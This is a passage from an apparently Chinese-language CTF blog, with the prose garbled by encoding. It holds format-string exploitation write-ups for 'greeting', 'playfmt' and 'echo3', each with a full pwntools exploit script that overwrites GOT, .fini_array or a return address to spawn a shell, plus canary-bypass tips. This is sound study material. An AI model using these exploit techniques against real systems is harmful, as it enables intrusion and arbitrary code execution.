·çš„,main å‡½æ•°ç»“æŸåä¹Ÿä¼šè°ƒç”¨.finiæ®µä»£ç å’Œ .fini_arrary æ®µçš„å‡½æ•°æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆã€‚ å…¶ä¸­FINI_ARRAYåŒºï¼šç¨‹åºç»“æŸéœ€è¦ç»è¿‡è¿™é‡Œï¼Œæ˜¯å¯ä»¥ä¿®æ”¹ä¸€ä¸‹è¿™é‡Œçš„ææ„å‡½æ•°ã€‚ä¿®æ”¹.fini_arrayåŒºçš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºstartï¼Œå°±å¯ä»¥å®ç°è®©ç¨‹åºä»å¤´å†æ¥ä¸€æ¬¡ï¼Œä¹Ÿå°±åˆå¯ä»¥ç”¨ä¸€æ¬¡æ¼æ´ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯,è¿™ä¸ªåŒºçš„å†…å®¹åœ¨å†æ¬¡ä»startå¼€å§‹æ‰§è¡Œååˆä¼šè¢«ä¿®æ”¹ã€‚ mma-ctf-2nd-2016-greetingä¿æŠ¤å’ŒarchArch: i386-32-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) idaåˆ†æint __cdecl main(int argc, const char **argv, const char **envp) &#123; char s; // [esp+1Ch] [ebp-84h] char v5; // [esp+5Ch] [ebp-44h] unsigned int v6; // [esp+9Ch] [ebp-4h] v6 = __readgsdword(0x14u); printf(\"Please tell me your name... \"); if ( !getnline(&amp;v5, 64) ) return puts(\"Don't ignore me ;( \"); sprintf(&amp;s, \"Nice to meet you, %s :)\\n\", &amp;v5); return printf(&amp;s); &#125; å‘ç°å‡½æ•°åœ¨è§¦å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä»¥åå°±ç»“æŸäº†ï¼Œæ²¡æœ‰åœ¨è°ƒç”¨å…¶ä»–çš„å‡½æ•°ï¼Œä¹Ÿå°±æ— æ³•åˆ©ç”¨GOTåŠ«æŒæˆ–è€…ä¿®æ”¹ret addrã€‚å†çœ‹ä¸‹getnlineå‡½æ•°ï¼š size_t __cdecl getnline(char *s, int n) &#123; char *v3; // [esp+1Ch] [ebp-Ch] fgets(s, n, stdin); v3 = strchr(s, 10); if ( v3 ) *v3 = 0; return strlen(s); &#125; å‘ç°æœ‰äº†strlençš„å‡½æ•°ï¼Œå¹¶ä¸”å…¶å‚æ•°ä¹Ÿæ˜¯å¯ä»¥æ§åˆ¶çš„ã€‚è¿™å°±æœ‰äº†æ”»å‡»æ€è·¯ï¼Œåœ¨è§¦å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ¼æ´æ—¶ï¼š ä¿®æ”¹.fini_arrayåŒºçš„ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆåœ°å€ä¸ºstartï¼Œè®©å…¶é‡å¯è·‘ä¸€æ¬¡ç¨‹åº å› ä¸ºçŸ¥é“è‚¯å®šä¼šè·‘åˆ°strlené‚£é‡Œï¼Œæ‰€ä»¥åœ¨åŠ«æŒstrlençš„GOTä¸ºsystem å¾…ç¨‹åºé‡æ–°è·‘èµ·æ¥ï¼Œå°±åœ¨ä¼ é€ä¸€ä¸ª/bin/shå³å¯ æ³¨æ„çš„æ˜¯,è¿™ä¸ª.fini_arrayåŒºçš„å†…å®¹åœ¨å†æ¬¡ä»startå¼€å§‹æ‰§è¡Œååˆä¼šè¢«ä¿®æ”¹,ä¸”ç¨‹åºå¯è¯»å–çš„å­—èŠ‚æ•°æœ‰é™,å› æ­¤éœ€è¦åŒæ—¶ä¿®æ”¹ä¸¤ä¸ªåœ°å€ï¼Œä¹Ÿå°±æ˜¯å•æ¬¡printfå¤šæ¬¡å†™å…¥ï¼Œè¿™ä¸ªé¢˜å¹¶ä¸”éœ€è¦åˆç†è°ƒæ•´payloadã€‚ gdbè°ƒè¯•è¿™ä¸ªé¢˜ç›®å› ä¸ºå‰é¢æœ‰ sprintf(&amp;s, \"Nice to meet you, %s :)\\n\", &amp;v5); æ‰€ä»¥å…¶æ ˆä¸Šä¼šæ”¾ä¸ŠNice to meet you,çš„å­—ç¬¦ä¸²ï¼Œæ­¤æ—¶éœ€è¦æ³¨æ„å¯¹é½ã€‚å¯¹é½åå‘ç°åç§»ä¸º12ï¼Œåœ¨å†™payloadçš„æ—¶å€™å¯ä»¥ä½¿ç”¨å•æ¬¡printfå¤šæ¬¡å†™å…¥çš„è„šæœ¬ï¼Œæ‰€ä»¥æ¥().ljust(0x32,&#39;a&#39;) ,æ‰€ä»¥åç§»éœ€è¦åŠ ä¸Š(0x32 - 2)/4 = 24 expfrom pwn import * context.arch = 'i386' context.log_level = 'debug' io = process('./greeting') # io = remote('111.198.29.45',42729) elf = ELF('./greeting') strlen_got = 0x08049A54 fini_array = 0x08049934 start = 0x080484F0 system_plt = 0x08048490 offset = 12 def fmt_short(prev,val,idx,byte = 2): result = \"\" if prev &lt; val : result += \"%\" + str(val - prev) + \"c\" elif prev == val : result += '' else : result += \"%\" + str(256**byte - prev + val) + \"c\" result += \"%\" + str(idx) + \"$hn\" return result key1 = 0x08048490 prev = 18 #æ³¨æ„è¿™ä¸ªé¢˜åœ¨å¯æ§æ ¼å¼åŒ–å­—ç¬¦ä¸²å‰æœ‰å­—ç¬¦è¾“å‡º payload = \"\" for i in range(2): payload +=fmt_short(prev,(key1 &gt;&gt; 16*i) &amp; 0xffff,24+i) prev = (key1 &gt;&gt; i*16) &amp; 0xffff key2 = 0x84F0 for i in range(1): payload +=fmt_short(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,26+i) prev = (key2 &gt;&gt; i*16) &amp; 0xffff payload = payload.ljust(0x32,'a') payload += p32(strlen_got) + p32(strlen_got+2) +p32(fini_array) io.recvuntil('name...') raw_input('-&gt;') io.sendline(payload) io.recvuntil('name...') io.sendline('/bin/sh\\x00') io.interactive() å°tipsç»•è¿‡canaryå¯ä»¥åˆ©ç”¨fmtæ¼æ´ï¼Œä»»æ„è¯»çš„ç‰¹æ€§ï¼Œåœ¨æœ‰canaryçš„ç¨‹åºä¸­ï¼Œç®—å¥½åç§»ä»¥åè¯»å‡ºcanaryå­˜çš„æ£€éªŒå€¼ï¼ˆåŸºæœ¬éƒ½æ˜¯ä»¥00ç»“å°¾æ¯”è¾ƒå¥½æ‰¾ï¼‰ï¼Œç„¶ååœ¨buffer overflow æ—¶ï¼Œåœ¨å¯¹åº”ä½ç½®å¡«ä¸Šcanaryæ£€éªŒå€¼ï¼Œå³å¯ç»•è¿‡canaryã€‚ printfå®¶æ—çš„å…¶ä»–å‡½æ•°é¦–å…ˆè¦è®°å¾—ä¸€ç‚¹å‡½æ•°å‚æ•°çš„å…¥æ ˆé¡ºåºï¼Œå¤§å¤šæ˜¯ä»å³åˆ°å·¦ä¾æ¬¡å…¥æ ˆï¼Œåœ¨é‡åˆ°å…¶ä»–çš„printfç±»å‡½æ•°ï¼Œåœ¨ç¡®å®šåç§»æ—¶ï¼Œä¸€å®šè¦è¦æŠŠæ¡fmtæ˜¯åœ¨æ ˆä¸Šçš„é‚£ä¸ªä½ç½®ï¼Œç„¶åè¿›è¡Œè®¡ç®—åç§»ï¼ˆä¸èƒ½ç®€å•çš„åˆ©ç”¨pwndbgçš„fmtargäº†ï¼‰ã€‚ fprintfï¼šåŸºæœ¬ä¸Šä¸€æ ·ï¼Œåªæ˜¯format string ä¸åœ¨ç¬¬ä¸€å‚æ•°ï¼Œä½¿å¾—overwrite function table æ—¶å¾ˆéš¾ä½¿ç”¨ sprintfï¼šå¯ä»¥ç”¨%xxc æ¥é€ æˆæ–°çš„buffer overflow åŠ«æŒ__stack_chk_fail åœ¨æ— æ³• stack overflow ä¹Ÿæ²¡æœ‰å…¶å®ƒå‡½æ•°å¯ä»¥åŠ«æŒæ—¶ï¼Œå¯ä»¥ä½¿ç”¨ä¿®æ”¹__stack_chk_fail çš„ G0T å¹¶ä¸”ç ´å canary ä½¿è¿™ä¸ªå‡½æ•°è¢«callï¼Œç„¶åjmpæƒ³è¦çš„ç›®æ ‡åœ°å€ åœ¨åªæœ‰ä¸€æ¬¡ stack overflow+fmt æ—¶å¯ä»¥å°†__stack_chk_failæ”¹æˆç›´æ¥ret ï¼Œè¿™æ ·stack overflow æ—¶å¯ä»¥æ— è§†canary ï¼Œä¹Ÿå¯ä»¥æ”¾ä¸ŠROPé“¾ï¼Œè¿›è€Œè¿›å…¥ä¹‹åçš„ROPã€‚ æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸åœ¨æ ˆä¸Šæœ‰æ—¶å€™å¹¶ä¸ä¼šè¿™ä¹ˆåˆšå¥½ format string çš„ buf åœ¨æ ˆä¸Šå½“å…¶åœ¨ data, bss æˆ–æ˜¯ heap ä¸Šçš„æƒ…å†µï¼Œæ— æ³•åœ¨ stack ä¸­æ”¾ä¸Šä¸€ä¸ª address ç»™ä»»æ„è¯»å†™çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨åœ¨ stack ä¸Šç°æœ‰çš„ pointer è¿›è¡Œå†™å€¼ã€‚å…¶ä¸­æœ€å¸¸ç”¨çš„å°±æ˜¯æ ˆä¸Šç°æœ‰çš„EBPé“¾ã€‚ EBPé“¾ æ­£å¦‚è¿™ä¸ªå›¾ï¼Œå½“ä¸€ä¸ªç¨‹åºå®Œæˆäº†ç”±mainâ€”&gt;Aâ€”&gt;Bçš„å‡½æ•°è°ƒç”¨ï¼Œæ ˆä¸Šå°±ä¼šå­˜åœ¨ä¸€ä¸ªEBPé“¾ï¼Œåƒå›¾ä¸­çš„ebp3(B)â€”&gt;ebp2(A)â€”&gt;ebp1(main)ï¼Œç„¶å é€šè¿‡æ‰¾å‡†offset1(ç®—ä¸€ä¸‹ebp3ä¸fmtå­—ç¬¦ä¸²è·ç¦»)å¯¹EBP2ä½¿ç”¨%hhnï¼Œå°±å¯ä»¥ä¿®æ”¹åˆ°EBP1çš„æœ€ä½ä½ï¼Œä½¿å¾—EBP1åœ¨ä¸€ä¸ª256çš„èŒƒå›´å†…è¿›è¡Œå˜åŒ–ï¼Œå¯ä»¥æ”¹æˆä½ æƒ³è¦ä¿®æ”¹çš„æ ˆå†…å­˜å•å…ƒæŒ‡é’ˆï¼ˆæ¯”å¦‚ret addressçš„æ ˆæŒ‡é’ˆï¼‰ã€‚ æ”¹å†™å¥½EBP1åï¼Œæ‰¾å‡†offset2 (ç®—ä¸€ä¸‹EBP2ä¸fmtå­—ç¬¦ä¸²è·ç¦»)å†å¯¹EBP1ä½¿ç”¨%hhnæˆ–è€…%hnï¼Œå³å¯å®Œæˆå¯¹ä½ æƒ³è¦ä¿®æ”¹çš„åœ°å€çš„å†™å€¼ã€‚ ç®€å•æ¥è¯´ï¼Œè¿™ä¸ªæ”»å‡»è¿‡ç¨‹å°±æ˜¯ç¬¬ä¸€æ¬¡ä½¿ç”¨æ¼æ´æ˜¯æ„é€ å‡ºæˆ‘ä»¬è¦è¯»å†™çš„åœ°å€ï¼Œå†ä¸€æ¬¡åˆ™æ˜¯å¯¹å‰é¢æ„é€ å‡ºæ¥çš„åœ°å€è¿›è¡Œä»»æ„è¯»å†™ã€‚ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹å½“ä¸­ä¸€å®šè¦å­¦ä¼šå¯¹æ ˆä¸Šçš„å·²æœ‰æ•°æ®çš„çµæ´»çš„è¿ç”¨ã€‚ æ¥ä¸‹æ¥çœ‹ä¸€ä¸ªé¢˜æ¥ä»”ç»†åˆ†æä¸€ä¸‹ hitcontraining-playfmtä¿æŠ¤å’ŒarchArch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments æ²¡æœ‰ä»»ä½•ä¿æŠ¤ã€‚ idaåˆ†æint do_fmt() &#123; int result; // eax while ( 1 ) &#123; read(0, buf, 0xC8u); result = strncmp(buf, \"quit\", 4u); if ( !result ) break; printf(buf); &#125; return result; &#125; å…¶ä¸­çœ‹åˆ°bufåœ¨bssæ®µï¼šè¿™å°±æ˜¯ä¸åœ¨æ ˆä¸Šï¼Œä¸èƒ½è·Ÿå‰é¢çš„é¢˜ç›®ä¸€æ ·ï¼Œç›´æ¥åœ¨æ ˆä¸Šå†™ä¸Šåœ°å€ï¼Œç„¶åæ¥å®Œæˆæ”»å‡»ã€‚ ä¸Šå±‚æœ‰main å’Œplayå‡½æ•°ï¼Œä¸€å…±ä¸‰å±‚ï¼Œä¸”åœ¨ç¬¬ä¸‰å±‚çš„do-fmtå‡½æ•°å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè®©æˆ‘ä»¬å¾ˆæ–¹ä¾¿çš„ç”¨ebpé“¾æ¥å®Œæˆæ”»å‡»ã€‚ç„¶åï¼Œæœ‰æ— é™æ¬¡çš„è§¦å‘è¿™ä¸ªæ¼æ´çš„æœºä¼šã€‚ æ”»å‡»æ€è·¯ ï¼šå› ä¸ºæ²¡æœ‰å¼€nxä¿æŠ¤ï¼Œå¯ä»¥ç”¨shellcodeè¿›è¡Œæ”»å‡»ã€‚ä¿®æ”¹æŸä¸ªå‡½æ•°è¿”å›åœ°å€ï¼Œç„¶åæå‰åœ¨å¯æ§çš„bufåˆé€‚çš„åœ°æ–¹æ‘†ä¸Šshellcodeï¼Œç„¶åè·³ä¸Šå»å³å¯ã€‚ gdbè°ƒè¯•å®šä½åˆ°printfå‡½æ•°å¤„ï¼š gdb-peda$ b *0x0804854F Breakpoint 1 at 0x804854f å¯ä»¥çœ‹ä¸€ä¸‹æ­¤æ—¶çš„æ ˆæƒ…å†µï¼šespå¯„å­˜å™¨ï¼šè¿™é‡Œå°±æŠŠ0xffffd338å«åšebp3ï¼Œ0xffffd348ä¸ºebp2ï¼Œ0xffffd358ä¸ºebp1ã€‚ ç¬¬ä¸€æ¬¡ä¿®æ”¹ï¼šå¯¹ebp2ä½¿ç”¨%xxhhnä¿®æ”¹ebp1ä¸ºdo-fmtå‡½æ•°çš„retaddr 0xffffd33cçš„æ ˆæŒ‡é’ˆï¼ˆè¿™ä¸ªæ ˆæŒ‡é’ˆå¯ä»¥é€šè¿‡leakä¸€ä¸ªæ ˆåœ°å€ï¼Œç„¶åæ ¹æ®åç§»ç®—å‡ºæ¥ï¼‰ ç¬¬äºŒæ¬¡ä¿®æ”¹ ï¼š å¯¹ebp1ä½¿ç”¨%xxhn ä¿®æ”¹retaddr 0x80485ad ä¸ºä½ åœ¨bufå¤„æå‰æ‘†ä¸Šçš„shellcode è¿™æ ·ç¨‹åºåœ¨é€€å‡ºè¿™ä¸ªdo-fmtå‡½æ•°å°±ä¼šjmpåˆ°shellcodeä¸Šï¼Œè¿™æ ·å°±æ‹¿åˆ°shelläº†ã€‚ expfrom pwn import * import time context.log_level = 'debug' context.arch = 'i386' io = process('./ebp') # io = remote('node3.buuoj.cn',29994) buf = 0x0804a080 + 0x40 #0x804a0c0 raw_input('-&gt;') io.sendline('%4$p') ret_stack_addr = int(io.recv(10),16) - 28 print('leak ret_stack_addr:'+hex(ret_stack_addr)) key1 = int(str(hex(ret_stack_addr))[-2:],16) key2 = 0xa0c0 payload = '%&#123;&#125;c%4$hhn'.format(key1) raw_input('-&gt;') io.sendline(payload) io.recv() payload = '%&#123;&#125;c%12$hn'.format(key2) payload = payload.ljust(0x40) payload += asm(shellcraft.sh()) io.sendline(payload) io.interactive() è¿™ä¸ªé¢˜ç›®å°±æ˜¯å¾ˆå•çº¯çš„ç›´æ¥åˆ©ç”¨ebpé“¾è¿›è¡Œæ”»å‡»å³å¯ã€‚ ç„¶åå†çœ‹ä¸€ä¸ªæœ‰ç‚¹ä¸ä¸€æ ·çš„é¢˜ç›®ï¼š inndy-echo3ä¿æŠ¤å’ŒarchArch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) idaåˆ†æ è¿™ä¸€å¤„ä¼šè®©æ ˆç»“æ„çš„æƒ…å†µå˜å¾—æ— æ³•é¢„æµ‹ã€‚ç„¶åè¿›å…¥hardfmtï¼š for ( i = 0; i &lt;= 4; ++i ) &#123; read(0, buff, 0x1000u); printf(buff); &#125; è¿™ä¸€å¤„å­˜åœ¨fmtæ¼æ´ï¼Œä¸”å¾€ä¸‹çœ‹æ•´ä¸ªç¨‹åºæ„Ÿè§‰æ²¡ä»€ä¹ˆå¥½åˆ©ç”¨çš„ï¼Œæ²¡ä»€ä¹ˆåé—¨å‡½æ•°ã€‚é‚£æ”»å‡»æ€è·¯å°±å¯ä»¥æ˜¯ï¼šæ”¹printfçš„gotè¡¨ï¼Œç„¶ååœ¨ç¬¬5æ¬¡ä¼ è¿‡å»/bin/shå³å¯ã€‚ï¼ˆè¿™ä¸ªé¢˜ç›®æ€è·¯è¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œä½†æ˜¯æ ˆçš„éšæœºåŒ–ï¼Œè¿˜æœ‰å› ä¸ºè¿™ä¸ªæ¬¡æ•°çš„é™åˆ¶ï¼Œåœ¨å®é™…æ“ä½œè¿‡ç¨‹ä¸­ï¼Œè¦å……åˆ†çš„åˆ©ç”¨æ¯ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè®©è¿™ä¸ªé¢˜ç›®ä¸æ˜¯å¾ˆå®¹æ˜“åšï¼‰ gdbåˆ†æå®šä½åˆ°æ¼æ´printfå‡½æ•°å¤„ï¼šä¼šå‘ç°è¿™ä¸ªæƒ…å†µæ˜¯æ²¡æœ‰æ„æˆebpé“¾çš„ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦å’±ä»¬è‡ªå·±æ¥ä»”ç»†è§‚å¯Ÿæ ˆä¸Šçš„æ•°æ®ï¼Œç„¶åæ¥æŒ‘é€‰åˆé€‚çš„æ ˆæ•°æ®æ¥è¿›è¡Œåˆ©ç”¨ã€‚ å› ä¸ºæ ˆæƒ…å†µä¸ä¸€æ ·ï¼Œå¯ä»¥é€‰æ‹©æœ€é€‚åˆæˆ‘ä»¬åˆ©ç”¨æ¼æ´çš„æ ˆç©ºé—´æ¥è¿›è¡Œåˆ†æï¼Œè¿™æ ·åšèµ·æ¥ä¼šç®€å•ä¸€äº›ã€‚ æˆ‘è‡ªå·±é€‰æ‹©åœ¨åç§»åœ¨43çš„æ—¶å€™å¼€å§‹è¿›è¡Œåˆ†æï¼Œæƒ³åŠæ³•æ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼šä»”ç»†çœ‹ä¸‹æ­¤æ—¶çš„æ ˆæƒ…å†µ ï¼Œç„¶åå†æ¬¡ä»”ç»†åˆ†æä¸‹æˆ‘ä»¬çš„ç›®æ ‡ ï¼š æ³„æ¼libcåŸºå€ï¼Œè®¡ç®—å‡ºsystemçš„å†…å­˜åœ°å€ã€‚ åœ¨æ ˆä¸Šæ„é€ å‡ºprintfçš„gotåœ°å€å’Œprintfçš„got+2çš„åœ°å€ï¼ˆ0x0804a014å’Œ0x0804a016ï¼‰ åœ¨æ„é€ çš„gotåœ°å€ä¸Šï¼Œå¼€å§‹å†™systemåœ°å€ç”±äºè¿™ä¸ªæ¼æ´å¯ä»¥çš„ç”¨çš„æ¬¡æ•°æœ€å¤šæ˜¯4æ¬¡ï¼Œæ‰€ä»¥è¦å°½å¯èƒ½åˆ©ç”¨æ¯ä¸€æ¬¡ã€‚ å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå¾ˆç®€å•å°±å¯ä»¥æ³„æ¼å‡ºlibcåŸºå€ã€‚ä½†æ˜¯æ¥ä¸‹æ¥æ€ä¹ˆæ„é€ printfçš„gotåœ°å€å’Œprintfçš„gotåœ°å€+2çš„åœ°å€å°±æœ‰ç‚¹éš¾äº†ã€‚ æ­¤æ—¶æ³¨æ„å›¾ä¸Šå‰ä¸¤ä¸ªçº¢æ¡†ï¼Œå¯ä»¥å‘ç°æŠŠå‰äºŒä¸ªçº¢æ¡†è™½ä¸æ˜¯ebpçš„é“¾ï¼Œä½†æ˜¯è¿™ä¹Ÿæ˜¯æˆä¸€ä¸ªé“¾å¯ä»¥åˆ©ç”¨äº†ã€‚ç„¶åå¯ä»¥æŠŠç¬¬äºŒä¸ªçº¢æ¡†çš„ä¸¤ä¸ªåœ°å€ä¿®æ”¹ä¸º ç¬¬ä¸€ä¸ªçº¢æ¡†çš„ä¸¤ä¸ªæ ˆæŒ‡é’ˆï¼š è¿™é‡Œå¯ä»¥ç”¨gdbç›´æ¥æ¥æ‰‹åŠ¨è®¾ç½®ï¼Œè®©å’±ä»¬ä¸Šæ¥å°±å†™expè°ƒè¯•è¿˜æ˜¯æŒºè´¹åŠ²çš„ï¼š gdb-peda$ set *0xffbe5e6c = 0xffbe5d54 gdb-peda$ set *0xffbe5e64 = 0xffbe5d60 è¿™ä¸ªè¿‡ç¨‹ä¸­åœ¨æ³„æ¼ç›®æ ‡æ ˆåœ°å€ä»¥åï¼Œæ˜¯å¯ä»¥é€šè¿‡ä¸€æ¬¡printfå‡½æ•°å†™å…¥2æ¬¡åœ°å€ï¼Œå®ç°è¿™ä¸ªæ ˆæƒ…å†µçš„ã€‚ æ¥ç€å°±å¯ä»¥æ„é€ gotåœ°å€å’Œgot+2åœ°å€ï¼š gdb-peda$ set *0xffbe5d60 = 0x0804a016 gdb-peda$ set *0xffbe5d54 = 0x0804a014 ç„¶åå°±å¯ä»¥åˆ©ç”¨å¯¹gotåœ°å€å’Œgot+2åœ°å€ä½¿ç”¨%xhn,å†™systemçš„å†…å­˜åœ°å€ä¸Šprintfçš„gotäº†ï¼š 0120| 0xffbe5d88 --&gt; 0xffbe5e6c --&gt; 0xffbe5d54 --&gt; 0x804a014 --&gt; 0xf7e0cda0 (&lt;__libc_system&gt;: sub esp,0xc) å†™å¥½ä»¥åï¼Œå†ä¼ è¿‡å»ä¸€ä¸‹/bin/shå³å¯ã€‚ expfrom pwn import * context.log_level = 'debug' context.arch ='i386' import time elf = ELF('./echo3') debug = 1 while True: if debug : io = process('./echo3') libc = elf.libc else: io = remote('node3.buuoj.cn',25057) libc = ELF('./libc-2.23.so.i386') payload = '%43$pA%30$pA%47$p' io.sendline(payload) address = io.recvline().strip() if address[-3:] == '637': if address[7:10] == '637': libc_base = int(address[2:10],16) - 247 - libc.symbols['__libc_start_main'] tag1_stack_point = int(address[13:21],16) - 0x118 tag2_stack_point = int(address[13:21],16) - 0x104 - 0x8 system_addr = libc_base + libc.symbols['system'] print('system_addr -&gt;' + hex(system_addr)) print('tag1_stack_point -&gt;' + hex(tag1_stack_point)) print('tag2_stack_point -&gt;' + hex(tag2_stack_point)) break else : io.close() continue def fmtshort(prev,val,idx,byte = 2): result = \"\" if prev &lt; val : result += \"%\" + str(val - prev) + \"c\" elif prev == val : result += '' else : result += \"%\" + str(256**byte - prev + val) + \"c\" result += \"%\" + str(idx) + \"$hn\" return result def fmtbyte(prev,val,idx,byte = 1): result = \"\" if prev &lt; val : result += \"%\" + str(val - prev) + \"c\" elif prev == val : result += '' else : result += \"%\" + str(256**byte - prev + val) + \"c\" result += \"%\" + str(idx) + \"$hhn\" return result printf_got = 0x0804a014 key1 = int(hex(tag1_stack_point)[-4:],16) key2 = int(hex(tag2_stack_point)[-4:],16) info('--------change the two points to tag_stack_point:-------') # raw_input('-&gt;') prev = 0 payload = \"\" for i in range(1): payload +=fmtshort(prev,(key1 &gt;&gt; 16*i) &amp; 0xffff,30+i) prev = (key1 &gt;&gt; i*16) &amp; 0xffff for i in range(1): payload +=fmtshort(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,31+i) prev = (key2 &gt;&gt; i*16) &amp; 0xffff payload = payload + '1111' io.sendline(payload) io.recvuntil('1111') info('--------change got_table to printf_got:-------') prev = 0 payload = \"\" key3 = 0x14 key4 = 0x16 for i in range(1): payload +=fmtbyte(prev,(key3 &gt;&gt; 8*i) &amp; 0xff,87+i) prev = (key3 &gt;&gt; i*8) &amp; 0xff for i in range(1): payload +=fmtbyte(prev,(key4 &gt;&gt; 8*i) &amp; 0xff,85+i) prev = (key4 &gt;&gt; i*8) &amp; 0xff payload = payload + '2222' io.sendline(payload) io.recvuntil('2222') info('--------change printf_got to system_addr:-------') raw_input('-&gt;') prev = 0 payload = \"\" key5 = int(hex(system_addr)[-4:],16) key6 = int(hex(system_addr)[2:6],16) print('key5 -&gt; ' + hex(key5)) print('key6 -&gt; ' + hex(key6)) for i in range(1): payload +=fmtshort(prev,(key5 &gt;&gt; 16*i) &amp; 0xffff,17+i) prev = (key5 &gt;&gt; i*16) &amp; 0xffff for i in range(1): payload +=fmtshort(prev,(key6 &gt;&gt; 16*i) &amp; 0xffff,20+i) prev = (key6 &gt;&gt; i*16) &amp; 0xffff payload = payload + '3333' io.sendline(payload) sleep(1) io.recvuntil('3333') raw_input('&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;') io.sendline('/bin/sh\\x00\\x00\\x00\\x00\\x00\\x00') io.interactive() è¿™ä¸ªexpçš„éš¾ç‚¹åœ¨äºï¼š æ³¨æ„å»å®šä½åˆ°åˆé€‚çš„æ ˆç»“æ„å†å»åˆ©ç”¨ å°½é‡å……åˆ†åˆ©ç”¨æ¯ä¸€æ¬¡çš„printf å•æ¬¡printfå¤šæ¬¡å†™å…¥ æ³¨æ„æ¯æ¬¡ä¼ æ•°æ®è¿‡å»åï¼Œä¸€å®šè¦æ¥æ”¶ä¸€ä¸‹ï¼Œå¹¶ä¸”å†ä¸€æ¬¡çš„æ•°æ®è¯»å…¥è¦é˜²æ­¢bssä¸Šçš„ç¼“å†²åŒºé‡Œé¢å‚æ‚æ•°æ®çš„å½±å“ã€‚ å°æ€»ç»“é€šè¿‡è¿™ä¸¤ä¸ªä¾‹é¢˜è¯´æ˜ï¼Œé¢å¯¹fmtçš„bufä¸åœ¨æ ˆä¸Šæ—¶ï¼Œå½’æ ¹ç»“åº•ä¹Ÿå°±æ˜¯ä¸€å®šè¦å­¦ä¼šçµæ´»ã€å……åˆ†çš„åˆ©ç”¨æ ˆä¸Šçš„æ•°æ®,å•çº¯çš„ebpé“¾åªæ˜¯é€‚åˆç®€å•çš„æƒ…å†µã€‚ ä½†æ˜¯ä¹Ÿæ˜¯åšé¢˜æ—¶ï¼Œä¹Ÿæ˜¯ä¸€å®šè¦ä¼˜å…ˆè€ƒè™‘ebpé“¾æ˜¯å¦èƒ½åˆ©ç”¨ï¼Œå› ä¸ºebpé“¾æ„æˆçš„è¯ï¼Œå®ƒçš„ç›¸å¯¹åç§»å°±æ˜¯é’ˆå¯¹æ€§ç¨‹åºæœ¬èº«çš„ï¼ŒåŸºæœ¬ä¸ä¼šå—åˆ°libcç‰ˆæœ¬çš„å½±å“ï¼Œç”¨èµ·æ¥å¾ˆå¥½ç”¨ï¼Œè¦ä¼˜å…ˆè€ƒè™‘ã€‚ è¿˜æœ‰å°±æ˜¯é¢å¯¹è¿™ç§ä¼šæœ‰éšæœºæ ˆæƒ…å†µã€æ²¡æœ‰ebpé“¾çš„é¢˜ç›®ï¼Œä¸€å®šè¦æ³¨æ„æœ¬åœ°å’Œè¿œç¨‹çš„libcç‰ˆæœ¬ã€æ³¨æ„ç¯å¢ƒ,å› ä¸ºè¿™äº›ä¸ä¸€æ ·å¯¼è‡´æ ˆçš„æƒ…å†µä¹Ÿæ˜¯ä¸ä¸€æ ·çš„ï¼Œå¯¼è‡´expä¹Ÿè¦æœ‰ç›¸åº”çš„å˜åŒ–ã€‚","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"å­¦ä¹ è®°å½•","slug":"å­¦ä¹ è®°å½•","permalink":"http://chumen77.xyz/tags/å­¦ä¹ è®°å½•/"}]},{"title":"æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´é¢˜ç›®ç»ƒä¹ ","slug":"æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´é¢˜ç›®ç»ƒä¹ ","date":"2020-03-15T06:38:15.000Z","updated":"2020-06-26T03:43:20.333Z","comments":true,"path":"2020/03/15/æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´é¢˜ç›®ç»ƒä¹ /","link":"","permalink":"http://chumen77.xyz/2020/03/15/æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´é¢˜ç›®ç»ƒä¹ /","excerpt":"","text":"æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´é¢˜ç›®ç»ƒä¹ å‰è¨€æ•´åˆä¸€ä¸‹æœ€è¿‘åšçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²é¢˜ç›®çš„ç»ƒä¹ ï¼ŒæŠŠwpç»™å†™ä¸€ä¸‹ï¼Œæ–¹ä¾¿å¯¹æ€»ç»“å¯¹è¿™ä¸ªæ¼æ´çš„åˆ©ç”¨å¥—è·¯å’ŒæŠ€å·§ã€‚ inndy_echoä¿æŠ¤å’Œarch[*] '/media/psf/mypwn2/buuctf/inndy_echo/echo' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) idaåˆ†æint __cdecl __noreturn main(int argc, const char **argv, const char **envp) &#123; char s; // [esp+Ch] [ebp-10Ch] unsigned int v4; // [esp+10Ch] [ebp-Ch] v4 = __readgsdword(0x14u); setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); do &#123; fgets(&amp;s, 256, stdin); printf(&amp;s); &#125; while ( strcmp(&amp;s, \"exit\\n\") ); system(\"echo Goodbye\"); exit(0); &#125; 